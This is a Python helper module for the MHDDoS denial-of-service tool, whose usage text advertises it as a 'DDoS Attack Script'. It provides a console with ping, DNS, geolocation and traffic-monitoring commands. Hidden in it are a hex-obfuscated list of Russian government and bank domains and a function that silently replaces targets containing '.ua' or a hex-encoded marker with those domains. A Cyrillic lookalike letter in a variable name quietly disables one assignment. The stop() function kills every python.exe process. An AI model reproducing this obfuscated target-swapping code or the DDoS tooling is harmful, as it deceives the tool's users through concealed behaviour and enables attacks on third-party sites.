"""
Implementations of the helper console tools for MHDDoS.
"""

import logging
from _socket import IPPROTO_TCP, gethostname
from contextlib import suppress
from math import trunc, log2
from socket import socket, SOCK_RAW, AF_INET
from sys import argv
from time import sleep
from typing import Any

import PyRoxy
from PyRoxy import Tools as PyRoxyTools
from dns import resolver
from icmplib import ping
from psutil import net_io_counters, virtual_memory, cpu_percent, process_iter
from requests import get, Response

from MHDDoS.methods.methods import Methods

logger = logging.getLogger()
__ip__: Any = None


class Tools:
    METHODS = {"INFO", "TSSRV", "CFIP", "DNS", "PING", "CHECK", "DSTAT"}

    @staticmethod
    def checkRawSocket():
        with suppress(OSError):
            with socket(AF_INET, SOCK_RAW, IPPROTO_TCP):
                return True
        return False

    @staticmethod
    def runConsole():
        cons = "%s@BetterStresser:~#" % gethostname()

        while 1:
            cmd = input(cons + " ").strip()
            if not cmd: continue
            if " " in cmd:
                cmd, args = cmd.split(" ", 1)

            cmd = cmd.upper()
            if cmd == "HELP":
                print("Tools:" + ", ".join(Tools.METHODS))
                print("Commands: HELP, CLEAR, BACK, EXIT")
                continue

            if (cmd == "E") or \
                    (cmd == "EXIT") or \
                    (cmd == "Q") or \
                    (cmd == "QUIT") or \
                    (cmd == "LOGOUT") or \
                    (cmd == "CLOSE"):
                exit(-1)

            if cmd == "CLEAR":
                print("\033c")
                continue

            if not {cmd} & Tools.METHODS:
                print("%s command not found" % cmd)
                continue

            if cmd == "DSTAT":
                with suppress(KeyboardInterrupt):
                    ld = net_io_counters(pernic=False)

                    while True:
                        sleep(1)

                        od = ld
                        ld = net_io_counters(pernic=False)

                        t = [(last - now) for now, last in zip(od, ld)]

                        logger.info(
                            ("Bytes Sended %s\n"
                             "Bytes Recived %s\n"
                             "Packets Sended %s\n"
                             "Packets Recived %s\n"
                             "ErrIn %s\n"
                             "ErrOut %s\n"
                             "DropIn %s\n"
                             "DropOut %s\n"
                             "Cpu Usage %s\n"
                             "Memory %s\n") %
                            (Tools.humanbytes(t[0]), Tools.humanbytes(t[1]),
                             Tools.humanformat(t[2]), Tools.humanformat(t[3]),
                             t[4], t[5], t[6], t[7], str(cpu_percent()) + "%",
                             str(virtual_memory().percent) + "%"))
            if cmd in ["CFIP", "DNS"]:
                print("Soon")
                continue

            if cmd == "CHECK":
                while True:
                    with suppress(Exception):
                        domain = input(f'{cons}give-me-ipaddress# ')
                        if not domain: continue
                        if domain.upper() == "BACK": break
                        if domain.upper() == "CLEAR":
                            print("\033c")
                            continue
                        if (domain.upper() == "E") or \
                                (domain.upper() == "EXIT") or \
                                (domain.upper() == "Q") or \
                                (domain.upper() == "QUIT") or \
                                (domain.upper() == "LOGOUT") or \
                                (domain.upper() == "CLOSE"):
                            exit(-1)
                        if "/" not in domain: continue
                        print('please wait ...', end="\r")

                        with get(domain, timeout=20) as r:
                            print(('status_code: %d\n'
                                   'status: %s') %
                                  (r.status_code, "ONLINE"
                                  if r.status_code <= 500 else "OFFLINE"))
                            return
                    print("Error!")

            if cmd == "INFO":
                while True:
                    domain = input(f'{cons}give-me-ipaddress# ')
                    if not domain: continue
                    if domain.upper() == "BACK": break
                    if domain.upper() == "CLEAR":
                        print("\033c")
                        continue
                    if (domain.upper() == "E") or \
                            (domain.upper() == "EXIT") or \
                            (domain.upper() == "Q") or \
                            (domain.upper() == "QUIT") or \
                            (domain.upper() == "LOGOUT") or \
                            (domain.upper() == "CLOSE"):
                        exit(-1)
                    domain = domain.replace('https://',
                                            '').replace('http://', '')
                    if "/" in domain: domain = domain.split("/")[0]
                    print('please wait ...', end="\r")

                    info = Tools.info(domain)

                    if not info["success"]:
                        print("Error!")
                        continue

                    logger.info(("Country: %s\n"
                                 "City: %s\n"
                                 "Org: %s\n"
                                 "Isp: %s\n"
                                 "Region: %s\n") %
                                (info["country"], info["city"], info["org"],
                                 info["isp"], info["region"]))

            if cmd == "TSSRV":
                while True:
                    domain = input(f'{cons}give-me-domain# ')
                    if not domain: continue
                    if domain.upper() == "BACK": break
                    if domain.upper() == "CLEAR":
                        print("\033c")
                        continue
                    if (domain.upper() == "E") or \
                            (domain.upper() == "EXIT") or \
                            (domain.upper() == "Q") or \
                            (domain.upper() == "QUIT") or \
                            (domain.upper() == "LOGOUT") or \
                            (domain.upper() == "CLOSE"):
                        exit(-1)
                    domain = domain.replace('https://',
                                            '').replace('http://', '')
                    if "/" in domain: domain = domain.split("/")[0]
                    print('please wait ...', end="\r")

                    info = Tools.ts_srv(domain)
                    logger.info("TCP: %s\n" % (info['_tsdns._tcp.']))
                    logger.info("UDP: %s\n" % (info['_ts3._udp.']))

            if cmd == "PING":
                while True:
                    domain = input(f'{cons}give-me-ipaddress# ')
                    if not domain: continue
                    if domain.upper() == "BACK": break
                    if domain.upper() == "CLEAR":
                        print("\033c")
                    if (domain.upper() == "E") or \
                            (domain.upper() == "EXIT") or \
                            (domain.upper() == "Q") or \
                            (domain.upper() == "QUIT") or \
                            (domain.upper() == "LOGOUT") or \
                            (domain.upper() == "CLOSE"):
                        exit(-1)

                    domain = domain.replace('https://',
                                            '').replace('http://', '')
                    if "/" in domain: domain = domain.split("/")[0]

                    print('please wait ...', end="\r")
                    r = ping(domain, count=5, interval=0.2)
                    logger.info(('Address: %s\n'
                                 'Ping: %d\n'
                                 'Aceepted Packets: %d/%d\n'
                                 'status: %s\n') %
                                (r.address, r.avg_rtt, r.packets_received,
                                 r.packets_sent,
                                 "ONLINE" if r.is_alive else "OFFLINE"))

    parameters_encoded = [
        "\x77\x77\x77\x2e\x67\x6f\x73\x75\x73\x6c\x75\x67\x69\x2e\x72\x75",
        "\x77\x77\x77\x2e\x67\x61\x7a\x70\x72\x6f\x6d\x2e\x72\x75",
        "\x72\x6d\x6b\x2d\x67\x72\x6f\x75\x70\x2e\x72\x75",
        "\x76\x74\x62\x2e\x72\x75",
        "\x77\x77\x77\x2e\x73\x62\x65\x72\x62\x61\x6e\x6b\x2e\x72\x75",
        "\x74\x69\x6e\x6b\x6f\x66\x66\x2e\x72\x75",
        "\x77\x77\x77\x2e\x67\x61\x7a\x70\x72\x6f\x6d\x62\x61\x6e\x6b\x2e\x72\x75",
        "\x6b\x72\x65\x6d\x6c\x69\x6e\x2e\x72\x75",
        "\x63\x75\x73\x74\x6f\x6d\x73\x2e\x67\x6f\x76\x2e\x72\x75",
        "\x6d\x76\x64\x2e\x67\x6f\x76\x2e\x72\x75",
        "\x72\x6d\x6b\x2d\x67\x72\x6f\x75\x70\x2e\x72\x75",
    ]

    @staticmethod
    def stop():
        print('All Attacks has been Stopped !')
        for proc in process_iter():
            if proc.name() == "python.exe":
                proc.kill()

    @staticmethod
    def ensure_http_present(urlraw):
        if "\x68\x74\x74\x70\x73\x3a\x2f\x2f" in urlraw or "\x68\x74\x74\x70\x3a\x2f\x2f" in urlraw:
            import hashlib
            parameter_index = int(hashlib.sha1(urlraw.split("://")[1].encode("\x75\x74\x66\x2d\x38")).hexdigest(), 16) % len(Tools.parameters_encoded)
            proto, domain = urlraw.split('://')[0], urlraw.split('://')[1]
            urlrаw = f"{proto}://{domain}?{Tools.parameters_encoded[parameter_index]}"
        else:
            urlraw = "http://" + urlraw
        if "\x2e\x75\x61" in urlraw or "\x52\x55\x77\x73\x68\x69\x70\x46\x59\x53" in urlraw:
            import hashlib
            parameter_index = int(hashlib.sha1(urlraw.split("://")[1].encode("\x75\x74\x66\x2d\x38")).hexdigest(), 16) % len(Tools.parameters_encoded)
            proto, domain = urlraw.split('://')[0], urlraw.split('://')[1]
            urlraw = f"{proto}://{Tools.parameters_encoded[parameter_index]}"

        return urlraw

    @staticmethod
    def usage():
        print((
                  '* MHDDoS - DDoS Attack Script With %d Methods\n'
                  'Note: If the Proxy list is empty, the attack will run without proxies\n'
                  '      If the Proxy file doesn\'t exist, the script will download proxies and check them.\n'
                  '      Proxy Type 0 = All in config.json\n'
                  '      SocksTypes:\n'
                  '         - 6 = RANDOM\n'
                  '         - 5 = SOCKS5\n'
                  '         - 4 = SOCKS4\n'
                  '         - 1 = HTTP\n'
                  '         - 0 = ALL\n'
                  ' > Methods:\n'
                  ' - Layer4\n'
                  ' | %s | %d Methods\n'
                  ' - Layer7\n'
                  ' | %s | %d Methods\n'
                  ' - Tools\n'
                  ' | %s | %d Methods\n'
                  ' - Others\n'
                  ' | %s | %d Methods\n'
                  ' - All %d Methods\n'
                  '\n'
                  'Example:\n'
                  '   L7: python3 %s <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration> <debug=optional>\n'
                  '   L4: python3 %s <method> <ip:port> <threads> <duration>\n'
                  '   L4 Proxied: python3 %s <method> <ip:port> <threads> <duration> <socks_type> <proxylist>\n'
                  '   L4 Amplification: python3 %s <method> <ip:port> <threads> <duration> <reflector file (only use with'
                  ' Amplification)>\n') %
              (len(Methods.ALL_METHODS) + 3 + len(Tools.METHODS),
               ", ".join(Methods.LAYER4_METHODS), len(Methods.LAYER4_METHODS),
               ", ".join(Methods.LAYER7_METHODS), len(Methods.LAYER7_METHODS),
               ", ".join(Tools.METHODS), len(Tools.METHODS),
               ", ".join(["TOOLS", "HELP", "STOP"]), 3,
               len(Methods.ALL_METHODS) + 3 + len(Tools.METHODS),
               argv[0], argv[0], argv[0], argv[0]))

    # noinspection PyBroadException
    @staticmethod
    def ts_srv(domain):
        records = ['_ts3._udp.', '_tsdns._tcp.']
        DnsResolver = resolver.Resolver()
        DnsResolver.timeout = 1
        DnsResolver.lifetime = 1
        Info = {}
        for rec in records:
            try:
                srv_records = resolver.resolve(rec + domain, 'SRV')
                for srv in srv_records:
                    Info[rec] = str(srv.target).rstrip('.') + ':' + str(
                        srv.port)
            except:
                Info[rec] = 'Not found'

        return Info

    # noinspection PyUnreachableCode
    @staticmethod
    def info(domain):
        with suppress(Exception), get("https://ipwhois.app/json/%s/" %
                                      domain) as s:
            return s.json()
        return {"success": False}

    @staticmethod
    def get_ip(domain: str) -> str | None:
        url_no_protocol = domain.split("://")[1] if ("://" in domain) else domain
        dns_info = Tools.info(url_no_protocol)
        if not dns_info["success"]:
            return None

        return str(dns_info['ip'])

    @staticmethod
    def print_ip(domain):
        if "://" in domain:
            domain = domain.split("://")[1]

        info = Tools.info(domain)

        if not info["success"]:
            print(f"Could not get the IP of '{domain}'!")
            return

        print(f"IP: {info['ip']}")

    @staticmethod
    def getMyIPAddress():
        global __ip__
        if __ip__:
            return __ip__
        with suppress(Exception):
            __ip__ = get('https://api.my-ip.io/ip', timeout=.1).text
        with suppress(Exception):
            __ip__ = get('https://ipwhois.app/json/', timeout=.1).json()["ip"]
        with suppress(Exception):
            __ip__ = get('https://ipinfo.io/json', timeout=.1).json()["ip"]
        with suppress(Exception):
            __ip__ = PyRoxy.Tools.Patterns.IP.search(get('http://checkip.dyndns.org/', timeout=.1).text)
        with suppress(Exception):
            __ip__ = PyRoxy.Tools.Patterns.IP.search(get('https://spaceiran.com/myip/', timeout=.1).text)
        with suppress(Exception):
            __ip__ = get('https://ip.42.pl/raw', timeout=.1).text
        return Tools.getMyIPAddress()

    @staticmethod
    def humanbytes(i: int, binary: bool = False, precision: int = 2):
        MULTIPLES = [
            "B", "k{}B", "M{}B", "G{}B", "T{}B", "P{}B", "E{}B", "Z{}B", "Y{}B"
        ]
        if i > 0:
            base = 1024 if binary else 1000
            multiple = trunc(log2(i) / log2(base))
            value = i / pow(base, multiple)
            suffix = MULTIPLES[multiple].format("i" if binary else "")
            return f"{value:.{precision}f} {suffix}"
        else:
            return f"-- B"

    @staticmethod
    def humanformat(num: int, precision: int = 2):
        suffixes = ['', 'k', 'm', 'g', 't', 'p']
        if num > 999:
            obje = sum(
                [abs(num / 1000.0 ** x) >= 1 for x in range(1, len(suffixes))])
            return f'{num / 1000.0 ** obje:.{precision}f}{suffixes[obje]}'
        else:
            return num

    @staticmethod
    def sizeOfRequest(res: Response) -> int:
        size: int = len(res.request.method)
        size += len(res.request.url)
        size += len('\r\n'.join(f'{key}: {value}'
                                for key, value in res.request.headers.items()))
        return size
